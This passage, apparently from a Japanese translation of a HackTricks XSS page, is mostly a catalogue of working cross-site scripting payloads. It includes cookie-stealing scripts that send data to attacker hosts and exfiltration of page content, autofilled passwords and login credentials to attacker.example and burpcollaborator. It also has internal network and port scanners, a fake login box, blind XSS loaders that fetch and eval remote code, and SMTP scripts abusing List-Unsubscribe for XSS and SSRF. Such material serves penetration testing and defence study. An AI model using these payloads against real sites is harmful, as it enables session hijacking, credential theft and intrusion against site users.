<script>document.write('<img src="http://<YOUR_SERVER_IP>?c='+document.cookie+'" />')</script>
<script>window.location.assign('http://<YOUR_SERVER_IP>/Stealer.php?cookie='+document.cookie)</script>
<script>window['location']['assign']('http://<YOUR_SERVER_IP>/Stealer.php?cookie='+document.cookie)</script>
<script>window['location']['href']('http://<YOUR_SERVER_IP>/Stealer.php?cookie='+document.cookie)</script>
<script>document.location=["http://<YOUR_SERVER_IP>?c",document.cookie].join()</script>
<script>var i=new Image();i.src="http://<YOUR_SERVER_IP>/?c="+document.cookie</script>
<script>window.location="https://<SERVER_IP>/?c=".concat(document.cookie)</script>
<script>var xhttp=new XMLHttpRequest();xhttp.open("GET", "http://<SERVER_IP>/?c="%2Bdocument.cookie, true);xhttp.send();</script>
<script>eval(atob('ZG9jdW1lbnQud3JpdGUoIjxpbWcgc3JjPSdodHRwczovLzxTRVJWRVJfSVA+P2M9IisgZG9jdW1lbnQuY29va2llICsiJyAvPiIp'));</script>
<script>fetch('https://YOUR-SUBDOMAIN-HERE.burpcollaborator.net', {method: 'POST', mode: 'no-cors', body:document.cookie});</script>
<script>navigator.sendBeacon('https://ssrftest.com/x/AAAAA',document.cookie)</script>
```
> [!TIP]
> cookieにHTTPOnlyフラグが設定されている場合、**JavaScriptからcookiesにアクセスすることはできません**。しかし、運が良ければ[some ways to bypass this protection](../hacking-with-cookies/index.html#httponly)があります。

### ページのコンテンツを盗む
```javascript
var url = "http://10.10.10.25:8000/vac/a1fbf2d1-7c3f-48d2-b0c3-a205e54e09e8"
var attacker = "http://10.10.14.8/exfil"
var xhr = new XMLHttpRequest()
xhr.onreadystatechange = function () {
if (xhr.readyState == XMLHttpRequest.DONE) {
fetch(attacker + "?" + encodeURI(btoa(xhr.responseText)))
}
}
xhr.open("GET", url, true)
xhr.send(null)
```
### 内部IPを見つける
```html
<script>
var q = []
var collaboratorURL =
"http://5ntrut4mpce548i2yppn9jk1fsli97.burpcollaborator.net"
var wait = 2000
var n_threads = 51

// Prepare the fetchUrl functions to access all the possible
for (i = 1; i <= 255; i++) {
q.push(
(function (url) {
return function () {
fetchUrl(url, wait)
}
})("http://192.168.0." + i + ":8080")
)
}

// Launch n_threads threads that are going to be calling fetchUrl until there is no more functions in q
for (i = 1; i <= n_threads; i++) {
if (q.length) q.shift()()
}

function fetchUrl(url, wait) {
console.log(url)
var controller = new AbortController(),
signal = controller.signal
fetch(url, { signal })
.then((r) =>
r.text().then((text) => {
location =
collaboratorURL +
"?ip=" +
url.replace(/^http:\/\//, "") +
"&code=" +
encodeURIComponent(text) +
"&" +
Date.now()
})
)
.catch((e) => {
if (!String(e).includes("The user aborted a request") && q.length) {
q.shift()()
}
})

setTimeout((x) => {
controller.abort()
if (q.length) {
q.shift()()
}
}, wait)
}
</script>
```
### Port Scanner (fetch)
```javascript
const checkPort = (port) => { fetch(http://localhost:${port}, { mode: "no-cors" }).then(() => { let img = document.createElement("img"); img.src = http://attacker.com/ping?port=${port}; }); } for(let i=0; i<1000; i++) { checkPort(i); }
```
### Port Scanner (websockets)
```python
var ports = [80, 443, 445, 554, 3306, 3690, 1234];
for(var i=0; i<ports.length; i++) {
var s = new WebSocket("wss://192.168.1.1:" + ports[i]);
s.start = performance.now();
s.port = ports[i];
s.onerror = function() {
console.log("Port " + this.port + ": " + (performance.now() -this.start) + " ms");
};
s.onopen = function() {
console.log("Port " + this.port+ ": " + (performance.now() -this.start) + " ms");
};
}
```
_短い時間は応答しているポートを示します_ _長い時間は応答がないことを示します._

Chromeでブロックされているポートの一覧は[**here**](https://src.chromium.org/viewvc/chrome/trunk/src/net/base/net_util.cc)、Firefoxでは[**here**](https://www-archive.mozilla.org/projects/netlib/portbanning#portlist)を参照してください。

### 認証情報を求めるボックス
```html
<style>::placeholder { color:white; }</style><script>document.write("<div style='position:absolute;top:100px;left:250px;width:400px;background-color:white;height:230px;padding:15px;border-radius:10px;color:black'><form action='https://example.com/'><p>Your sesion has timed out, please login again:</p><input style='width:100%;' type='text' placeholder='Username' /><input style='width: 100%' type='password' placeholder='Password'/><input type='submit' value='Login'></form><p><i>This login box is presented using XSS as a proof-of-concept</i></p></div>")</script>
```
### 自動入力パスワードの取得
```javascript
<b>Username:</><br>
<input name=username id=username>
<b>Password:</><br>
<input type=password name=password onchange="if(this.value.length)fetch('https://YOUR-SUBDOMAIN-HERE.burpcollaborator.net',{
method:'POST',
mode: 'no-cors',
body:username.value+':'+this.value
});">
```
パスワードフィールドに何らかのデータが入力されると、ユーザー名とパスワードは攻撃者のサーバーに送信されます。クライアントが保存されたパスワードを選択して何も入力しなくても、資格情報はex-filtratedされます。

### Hijack form handlers to exfiltrate credentials (const shadowing)

もし重要なハンドラ（例: `function DoLogin(){...}`）がページの後半で宣言され、あなたの payload がより早く実行される（例: via an inline JS-in-JS sink）場合、同じ名前の `const` を先に定義してハンドラを先取りしロックしてください。後からの function 宣言は `const` 名を再バインドできないため、あなたのフックが制御を維持します:
```javascript
const DoLogin = () => {
const pwd  = Trim(FormInput.InputPassword.value);
const user = Trim(FormInput.InputUtente.value);
fetch('https://attacker.example/?u='+encodeURIComponent(user)+'&p='+encodeURIComponent(pwd));
};
```
注意
- これは実行順序に依存します：インジェクションは正規の宣言より先に実行される必要があります。
- もしペイロードが `eval(...)` でラップされている場合、`const/let` のバインディングはグローバルになりません。真のグローバルで再バインド不能なバインディングを確実にするには、セクション「Deliverable payloads with eval(atob()) and scope nuances」で説明している動的な `<script>` インジェクション手法を使用してください。
- キーワードフィルタがコードをブロックする場合は、上で示したように Unicode エスケープされた識別子や `eval(atob('...'))` を組み合わせて配信してください。

### Keylogger

Just searching in github I found a few different ones:

- [https://github.com/JohnHoder/Javascript-Keylogger](https://github.com/JohnHoder/Javascript-Keylogger)
- [https://github.com/rajeshmajumdar/keylogger](https://github.com/rajeshmajumdar/keylogger)
- [https://github.com/hakanonymos/JavascriptKeylogger](https://github.com/hakanonymos/JavascriptKeylogger)
- また、metasploit の `http_javascript_keylogger` を使用することもできます。

### CSRF tokensの窃取
```javascript
<script>
var req = new XMLHttpRequest();
req.onload = handleResponse;
req.open('get','/email',true);
req.send();
function handleResponse() {
var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1];
var changeReq = new XMLHttpRequest();
changeReq.open('post', '/email/change-email', true);
changeReq.send('csrf='+token+'&email=test@test.com')
};
</script>
```
### PostMessage メッセージの窃取
```html
<img src="https://attacker.com/?" id=message>
<script>
window.onmessage = function(e){
document.getElementById("message").src += "&"+e.data;
</script>
```
### Service Workersの悪用


{{#ref}}
abusing-service-workers.md
{{#endref}}

### Shadow DOMへのアクセス


{{#ref}}
shadow-dom.md
{{#endref}}

### Polyglots


{{#ref}}
https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/xss_polyglots.txt
{{#endref}}

### Blind XSS payloads

次も使用できます: [https://xsshunter.com/](https://xsshunter.com)
```html
"><img src='//domain/xss'>
"><script src="//domain/xss.js"></script>
><a href="javascript:eval('d=document; _ = d.createElement(\'script\');_.src=\'//domain\';d.body.appendChild(_)')">Click Me For An Awesome Time</a>
<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//0mnb1tlfl5x4u55yfb57dmwsajgd42.burpcollaborator.net/scriptb");a.send();</script>

<!-- html5sec - Self-executing focus event via autofocus: -->
"><input onfocus="eval('d=document; _ = d.createElement(\'script\');_.src=\'\/\/domain/m\';d.body.appendChild(_)')" autofocus>

<!-- html5sec - JavaScript execution via iframe and onload -->
"><iframe onload="eval('d=document; _=d.createElement(\'script\');_.src=\'\/\/domain/m\';d.body.appendChild(_)')">

<!-- html5sec - SVG tags allow code to be executed with onload without any other elements. -->
"><svg onload="javascript:eval('d=document; _ = d.createElement(\'script\');_.src=\'//domain\';d.body.appendChild(_)')" xmlns="http://www.w3.org/2000/svg"></svg>

<!-- html5sec -  allow error handlers in <SOURCE> tags if encapsulated by a <VIDEO> tag. The same works for <AUDIO> tags  -->
"><video><source onerror="eval('d=document; _ = d.createElement(\'script\');_.src=\'//domain\';d.body.appendChild(_)')">

<!--  html5sec - eventhandler -  element fires an "onpageshow" event without user interaction on all modern browsers. This can be abused to bypass blacklists as the event is not very well known.  -->
"><body onpageshow="eval('d=document; _ = d.createElement(\'script\');_.src=\'//domain\';d.body.appendChild(_)')">

<!-- xsshunter.com - Sites that use JQuery -->
<script>$.getScript("//domain")</script>

<!-- xsshunter.com - When <script> is filtered -->
"><img src=x id=payload&#61;&#61; onerror=eval(atob(this.id))>

<!-- xsshunter.com - Bypassing poorly designed systems with autofocus -->
"><input onfocus=eval(atob(this.id)) id=payload&#61;&#61; autofocus>

<!-- noscript trick -->
<noscript><p title="</noscript><img src=x onerror=alert(1)>">

<!-- whitelisted CDNs in CSP -->
"><script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.6.1/angular.js"></script>
<script src="https://ajax.googleapis.com/ajax/libs/angularjs/1.6.1/angular.min.js"></script>
<!-- ... add more CDNs, you'll get WARNING: Tried to load angular more than once if multiple load. but that does not matter you'll get a HTTP interaction/exfiltration :-]... -->
<div ng-app ng-csp><textarea autofocus ng-focus="d=$event.view.document;d.location.hash.match('x1') ? '' : d.location='//localhost/mH/'"></textarea></div>

<!-- Payloads from https://www.intigriti.com/researchers/blog/hacking-tools/hunting-for-blind-cross-site-scripting-xss-vulnerabilities-a-complete-guide -->
<!-- Image tag -->
'"><img src="x" onerror="eval(atob(this.id))" id="Y29uc3QgeD1kb2N1bWVudC5jcmVhdGVFbGVtZW50KCdzY3JpcHQnKTt4LnNyYz0ne1NFUlZFUn0vc2NyaXB0LmpzJztkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKHgpOw==">

<!-- Input tag with autofocus -->
'"><input autofocus onfocus="eval(atob(this.id))" id="Y29uc3QgeD1kb2N1bWVudC5jcmVhdGVFbGVtZW50KCdzY3JpcHQnKTt4LnNyYz0ne1NFUlZFUn0vc2NyaXB0LmpzJztkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKHgpOw==">

<!-- In case jQuery is loaded, we can make use of the getScript method -->
'"><script>$.getScript("{SERVER}/script.js")</script>

<!-- Make use of the JavaScript protocol (applicable in cases where your input lands into the "href" attribute or a specific DOM sink) -->
javascript:eval(atob("Y29uc3QgeD1kb2N1bWVudC5jcmVhdGVFbGVtZW50KCdzY3JpcHQnKTt4LnNyYz0ne1NFUlZFUn0vc2NyaXB0LmpzJztkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKHgpOw=="))

<!-- Render an iframe to validate your injection point and receive a callback -->
'"><iframe src="{SERVER}"></iframe>

<!-- Bypass certain Content Security Policy (CSP) restrictions with a base tag -->
<base href="{SERVER}" />

<!-- Make use of the meta-tag to initiate a redirect -->
<meta http-equiv="refresh" content="0; url={SERVER}" />

<!-- In case your target makes use of AngularJS -->
{{constructor.constructor("import('{SERVER}/script.js')")()}}
```
### Regex - 隠されたコンテンツへのアクセス

[**this writeup**](https://blog.arkark.dev/2022/11/18/seccon-en/#web-piyosay)からわかるように、いくつかの値がJSから消えても、別のオブジェクト内のJS属性に残っており、そこから見つけられることがあります。例えば、REGEX の input の値が削除された後でも、その input を見つけることができます:
```javascript
// Do regex with flag
flag = "CTF{FLAG}"
re = /./g
re.test(flag)

// Remove flag value, nobody will be able to get it, right?
flag = ""

// Access previous regex input
console.log(RegExp.input)
console.log(RegExp.rightContext)
console.log(
document.all["0"]["ownerDocument"]["defaultView"]["RegExp"]["rightContext"]
)
```
### Brute-Force List


{{#ref}}
https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/xss.txt
{{#endref}}

## XSS を使った他の脆弱性の悪用

### Markdown内のXSS

レンダリングされるMarkdownコードを注入できますか？もしかするとXSSが発生するかもしれません！確認：


{{#ref}}
xss-in-markdown.md
{{#endref}}

### XSS を SSRF に

**キャッシュを使用するサイト**でXSSを見つけましたか？Edge Side Include Injectionを使って、**それをSSRFにアップグレード**してみてください。以下のpayload:
```python
<esi:include src="http://yoursite.com/capture" />
```
Use it to bypass cookie restrictions, XSS filters and much more!\
More information about this technique here: [**XSLT**](../xslt-server-side-injection-extensible-stylesheet-language-transformations.md).

### 動的に作成された PDF における XSS

ユーザ制御の入力を使って PDF を生成するウェブページがある場合、PDF を作成する **bot を騙して** 任意の **JS コードを実行させる**ことを試みることができます。\
つまり、**PDF creator bot が**何らかの **HTML タグ**を見つけると、それらを**解釈**し、その挙動を**悪用**して **Server XSS** を引き起こすことができます。


{{#ref}}
server-side-xss-dynamic-pdf.md
{{#endref}}

HTML タグを注入できない場合は、**PDF データを注入**することを試す価値があります:


{{#ref}}
pdf-injection.md
{{#endref}}

### Amp4Email における XSS

AMP はモバイルデバイス上でのウェブページ表示を高速化することを目的としており、速度とセキュリティを重視しつつ、HTML タグに JavaScript を組み合わせて機能を提供します。さまざまな機能用のコンポーネント群をサポートしており、[AMP components](https://amp.dev/documentation/components/?format=websites) から利用できます。

[**AMP for Email**](https://amp.dev/documentation/guides-and-tutorials/learn/email-spec/amp-email-format/) 形式は特定の AMP コンポーネントをメールに拡張し、受信者がメール内で直接コンテンツとやり取りできるようにします。

Example [**writeup XSS in Amp4Email in Gmail**](https://adico.me/post/xss-in-gmail-s-amp4email).

### List-Unsubscribe Header の悪用 (Webmail XSS & SSRF)

RFC 2369 の `List-Unsubscribe` ヘッダは、攻撃者が制御する URI を埋め込むことができ、多くの webmail やメールクライアントがそれらを自動的に「Unsubscribe」ボタンに変換します。これらの URI が検証なしにレンダリングされたりフェッチされたりすると、ヘッダは stored XSS（unsubscribe リンクが DOM に配置される場合）および SSRF（サーバがユーザに代わって unsubscribe リクエストを実行する場合）の両方に対する注入ポイントになります。

#### Stored XSS via `javascript:` URIs

1. **自分にメールを送る** — ヘッダが `javascript:` URI を指すようにし、メッセージの残りは良性にしてスパムフィルタに弾かれないようにする。
2. **UI がその値をレンダリングすることを確認する**（多くのクライアントは "List Info" パネルで表示します）そして結果として生成される `<a>` タグが `href` や `target` のような攻撃者制御の属性を継承しているかを確認する。
3. **実行をトリガーする**（例: CTRL+click、middle-click、または "open in new tab"）リンクが `target="_blank"` を使用している場合；ブラウザは指定された JavaScript を webmail アプリケーションのオリジンで評価します。
4. stored-XSS のプリミティブを確認する: ペイロードはメールに保持され、実行にはクリックだけが必要になります。
```text
List-Unsubscribe: <javascript://attacker.tld/%0aconfirm(document.domain)>
List-Unsubscribe-Post: List-Unsubscribe=One-Click
```
URI 内の改行バイト (`%0a`) は、Horde IMP H5 のような脆弱なクライアントでレンダリングパイプラインを通過しても通常とは異なる文字が残り、aタグ内に文字列をそのまま出力することを示しています。

<details>
<summary>悪意のある List-Unsubscribe header を送信する Minimal SMTP PoC</summary>
```python
#!/usr/bin/env python3
import smtplib
from email.message import EmailMessage

smtp_server = "mail.example.org"
smtp_port = 587
smtp_user = "user@example.org"
smtp_password = "REDACTED"
sender = "list@example.org"
recipient = "victim@example.org"

msg = EmailMessage()
msg.set_content("Testing List-Unsubscribe rendering")
msg["From"] = sender
msg["To"] = recipient
msg["Subject"] = "Newsletter"
msg["List-Unsubscribe"] = "<javascript://evil.tld/%0aconfirm(document.domain)>"
msg["List-Unsubscribe-Post"] = "List-Unsubscribe=One-Click"

with smtplib.SMTP(smtp_server, smtp_port) as smtp:
smtp.starttls()
smtp.login(smtp_user, smtp_password)
smtp.send_message(msg)
```
</details>

#### サーバー側の配信停止プロキシ -> SSRF

一部のクライアント（例: Nextcloud Mail app）は、配信停止操作をサーバー側でプロキシします：ボタンをクリックするとサーバーが指定されたURLを自身で取得するよう指示されます。これによりヘッダがSSRFプリミティブになり得ます。特に管理者が `'allow_local_remote_servers' => true` に設定している場合（[HackerOne report 2902856](https://hackerone.com/reports/2902856) に記載）、ループバックやRFC1918レンジへのリクエストが許可されます。

1. **メールを作成する**: `List-Unsubscribe` が攻撃者管理のエンドポイントを指すようにする（ブラインドSSRFには Burp Collaborator / OAST を使用）。
2. **`List-Unsubscribe-Post: List-Unsubscribe=One-Click` を保持する** — UI にワンクリックの配信停止ボタンが表示されるようにする。
3. **信頼要件を満たす**: 例えば Nextcloud は、メッセージが DKIM を通過した場合にのみ HTTPS の配信停止リクエストを実行するため、攻撃者は自分が管理するドメインでメールに署名する必要がある。
4. **対象サーバーで処理されるメールボックスにメッセージを配信する**、そしてユーザーが配信停止ボタンをクリックするまで待つ。
5. **サーバー側のコールバックを** collaborator エンドポイントで観察し、プリミティブが確認されたら内部アドレスへピボットする。
```text
List-Unsubscribe: <http://abcdef.oastify.com>
List-Unsubscribe-Post: List-Unsubscribe=One-Click
```
<details>
<summary>SSRF テスト用の DKIM-signed List-Unsubscribe メッセージ</summary>
```python
#!/usr/bin/env python3
import smtplib
from email.message import EmailMessage
import dkim

smtp_server = "mail.example.org"
smtp_port = 587
smtp_user = "user@example.org"
smtp_password = "REDACTED"
dkim_selector = "default"
dkim_domain = "example.org"
dkim_private_key = """-----BEGIN PRIVATE KEY-----\n...\n-----END PRIVATE KEY-----"""

msg = EmailMessage()
msg.set_content("One-click unsubscribe test")
msg["From"] = "list@example.org"
msg["To"] = "victim@example.org"
msg["Subject"] = "Mailing list"
msg["List-Unsubscribe"] = "<http://abcdef.oastify.com>"
msg["List-Unsubscribe-Post"] = "List-Unsubscribe=One-Click"

raw = msg.as_bytes()
signature = dkim.sign(
message=raw,
selector=dkim_selector.encode(),
domain=dkim_domain.encode(),
privkey=dkim_private_key.encode(),
include_headers=["From", "To", "Subject"]
)
msg["DKIM-Signature"] = signature.decode().split(": ", 1)[1].replace("\r", "").replace("\n", "")

with smtplib.SMTP(smtp_server, smtp_port) as smtp:
smtp.starttls()
smtp.login(smtp_user, smtp_password)
smtp.send_message(msg)
```
</details>

**テストノート**

- OASTエンドポイントを使ってブラインドSSRFのヒットを収集し、プリミティブが確認されたら`List-Unsubscribe`のURLを`http://127.0.0.1:PORT`、メタデータサービス、またはその他の内部ホストに向けるように調整します。
- unsubscribe helperはしばしばアプリケーションと同じHTTPスタックを再利用するため、そのプロキシ設定、HTTPメソッド、およびヘッダー書き換えを継承します。これにより、[SSRF methodology](../ssrf-server-side-request-forgery/README.md)で説明されているさらなるトラバーサルトリックが可能になります。

### XSS: ファイルアップロード (svg)

次のようなファイルを画像としてアップロードします（出典: [http://ghostlulz.com/xss-svg/](http://ghostlulz.com/xss-svg/)）:
```html
Content-Type: multipart/form-data; boundary=---------------------------232181429808
Content-Length: 574
-----------------------------232181429808
Content-Disposition: form-data; name="img"; filename="img.svg"
Content-Type: image/svg+xml

<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
<rect width="300" height="100" style="fill:rgb(0,0,255);stroke-width:3;stroke:rgb(0,0,0)" />
<script type="text/javascript">
alert(1);
</script>
</svg>
-----------------------------232181429808--
```

```html
<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
<script type="text/javascript">alert("XSS")</script>
</svg>
```

```html
<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
<polygon id="triangle" points="0,0 0,50 50,0" fill="#009900" stroke="#004400"/>
<script type="text/javascript">
alert("XSS");
</script>
</svg>
```

```svg
<svg width="500" height="500"
xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
<circle cx="50" cy="50" r="45" fill="green"
id="foo"/>

<foreignObject width="500" height="500">
<iframe xmlns="http://www.w3.org/1999/xhtml" src="data:text/html,&lt;body&gt;&lt;script&gt;document.body.style.background=&quot;red&quot;&lt;/script&gt;hi&lt;/body&gt;" width="400" height="250"/>
<iframe xmlns="http://www.w3.org/1999/xhtml" src="javascript:document.write('hi');" width="400" height="250"/>
</foreignObject>
</svg>
```

```html
<svg><use href="//portswigger-labs.net/use_element/upload.php#x" /></svg>
```

```xml
<svg><use href="data:image/svg+xml,&lt;svg id='x' xmlns='http://www.w3.org/2000/svg' &gt;&lt;image href='1' onerror='alert(1)' /&gt;&lt;/svg&gt;#x" />
```
以下でさらに多くのSVG payloadsは [**https://github.com/allanlw/svg-cheatsheet**](https://github.com/allanlw/svg-cheatsheet) にあります

## その他のJSトリックと関連情報


{{#ref}}
other-js-tricks.md
{{#endref}}

## XSS リソース

- [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20injection)
- [http://www.xss-payloads.com](http://www.xss-payloads.com) [https://github.com/Pgaijin66/XSS-Payloads/blob/master/payload.txt](https://github.com/Pgaijin66/XSS-Payloads/blob/master/payload.txt) [https://github.com/materaj/xss-list](https://github.com/materaj/xss-list)
- [https://github.com/ismailtasdelen/xss-payload-list](https://github.com/ismailtasdelen/xss-payload-list)
- [https://gist.github.com/rvrsh3ll/09a8b933291f9f98e8ec](https://gist.github.com/rvrsh3ll/09a8b933291f9f98e8ec)
- [https://netsec.expert/2020/02/01/xss-in-2020.html](https://netsec.expert/2020/02/01/xss-in-2020.html)
- [https://www.intigriti.com/researchers/blog/hacking-tools/hunting-for-blind-cross-site-scripting-xss-vulnerabilities-a-complete-guide](https://www.intigriti.com/researchers/blog/hacking-tools/hunting-for-blind-cross-site-scripting-xss-vulnerabilities-a-complete-guide)

## 参考資料

- [XSS and SSRF via the List-Unsubscribe SMTP Header in Horde Webmail and Nextcloud Mail](https://security.lauritz-holtmann.de/post/xss-ssrf-list-unsubscribe/)
- [HackerOne Report #2902856 - Nextcloud Mail List-Unsubscribe SSRF](https://hackerone.com/reports/2902856)
- [From "Low-Impact" RXSS to Credential Stealer: A JS-in-JS Walkthrough](https://r3verii.github.io/bugbounty/2025/08/25/rxss-credential-stealer.html)
- [MDN eval()](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/eval)

{{#include ../../banners/hacktricks-training.md}}
